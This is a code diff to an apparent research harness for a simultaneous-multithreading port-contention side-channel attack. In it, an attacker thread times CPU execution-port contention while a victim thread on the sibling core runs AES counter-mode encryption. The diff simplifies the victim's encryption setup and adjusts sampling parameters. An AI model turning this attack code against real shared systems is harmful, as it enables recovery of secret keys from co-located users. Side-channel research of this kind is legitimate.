@@ -11,7 +11,11 @@
 #define countof(x) (sizeof(x)/sizeof(*(x)))
 
 #define RUNS_PER_PORT  0x400
-#define NUM_SAMPLES    0x1000
+#define NUM_SAMPLES    300
+
+#define NUM_BLOCKS      0x80
+
+extern uintptr_t aes_gctr_linear(void *icb, void* x, void *y, unsigned int num_blocks);
 
 extern void contend_p0(unsigned long* out_buf, unsigned long num_entries);
 extern void contend_p1(unsigned long* out_buf, unsigned long num_entries);
@@ -19,7 +23,7 @@ extern void contend_p5(unsigned long* out_buf, unsigned long num_entries);
 extern void contend_p06(unsigned long* out_buf, unsigned long num_entries);
 
 volatile unsigned char* sync_page = NULL;
-aes_gcm_context aes_context;
+
 
 static void set_processor_affinity(unsigned int core_id) {
     cpu_set_t cpuset;
@@ -67,14 +71,39 @@ static uint32_t get_sibling_cores(){
 
 // The victim simply waits for the attacker to synchronize, and then starts the encryption
 static void __attribute__((noreturn)) victim() {
+    aes_uint128 icb = {.u64={0, 0}}, x[NUM_BLOCKS] = {{.u64={0, 0}},}, y[NUM_BLOCKS] = {{.u64={0, 0}},};
+    *sync_page = 1;
     for(;;) {
-        while (!*sync_page) { asm volatile("lfence"); }
-        aes_gcm_encrypt(&aes_context);
+        while (!*sync_page) { asm volatile("lfence");}
+        aes_gctr_linear(&icb, &x, &y, NUM_BLOCKS);
+        asm volatile(".rept 1024\nnop\nlfence\n.endr");
+        aes_gctr_linear(&icb, &x, &y, NUM_BLOCKS);
         *sync_page = 0;
     }
 }
 
 static void attacker() {
+    /*
+    uint64_t t1, t2, A = 0;
+
+    for (unsigned I = 0; I < 5; I++){
+        *sync_page = 1;
+        while(*sync_page) {asm volatile("lfence");}
+    }
+    for(unsigned I = 0; I < 0x1000; I++){
+        *sync_page = 1;
+        asm volatile("mfence\nrdtsc\nmfence" : "=a"(t1) :: "rdx");
+        while(*sync_page) {asm volatile("lfence");}
+        asm volatile("rdtsc" : "=a"(t2) :: "rdx");
+
+        A += t2 - t1;
+    }
+    printf("%lu\n", A / 0x1000);
+    printf("Done.\n");
+    return;
+    */
+
+
     unsigned i, j;
     static uint64_t result_buffer[NUM_SAMPLES];
     const static struct {
@@ -97,6 +126,7 @@ static void attacker() {
         while(*sync_page) {asm volatile("lfence");}
     }
 
+
     // Run the actual attack
     for(i = 0; i < countof(ports); i++) {
         for (j = 0; j < RUNS_PER_PORT; j++) {
@@ -116,29 +146,11 @@ int main() {
     static aes_uint128 iv = {.u64 = { 0xcafebabecafebabe, 0xdeafbeefdeadbeef}};
     static aes_uint128 tag = {.u64 = { 0, 0}};
 
-    unsigned char* gctr;
-    aes_uint128 key = {.u64 = {0xdeafbeefdeadbeef, 0xcafebabecafebabe}};
     uint32_t cores = get_sibling_cores();
 
     // Set up sync page
     sync_page = mmap(NULL, getpagesize(), PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
 
-    // Set up encryption parameters
-    memset(&aes_context, 0, sizeof(aes_context));
-    memset(plain, 0xba, sizeof(plain));
-    gctr = mmap(NULL, getpagesize(), PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
-    init_counter_mode_function((aes_fun_code *) gctr, &key);
-    aes_context = (aes_gcm_context) {
-        .gctr = (gctr_fun) gctr,
-        .aad = NULL,
-        .aad_size = 0,
-        .ciphertext = cipher,
-        .plaintext = plain,
-        .iv = (char*) &iv,
-        .iv_len = sizeof(iv),
-        .tag = (char*) &tag,
-        .num_blocks = sizeof(plain) / GCM_BLOCK_BYTES,
-    };
     *sync_page = 0;
 
     printf("Running on cores %u and %u!\n", cores & 0xff, cores >> 16);
